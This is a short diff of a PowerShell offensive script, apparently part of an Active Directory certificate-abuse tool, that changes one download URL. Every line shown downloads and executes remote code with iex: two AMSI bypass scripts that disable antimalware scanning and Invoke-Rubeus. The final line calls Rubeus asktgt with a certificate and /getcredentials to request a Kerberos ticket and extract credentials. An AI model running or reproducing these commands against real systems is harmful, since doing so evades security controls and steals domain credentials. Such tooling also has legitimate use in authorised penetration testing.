@@ -358,7 +358,7 @@ CertificateTemplate = "$TemplateName"
 	}
 		
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
-	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
 	
 	$RubOutput = Invoke-Rubeus asktgt /user:$CN /certificate:$pwd\$CN.pfx /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
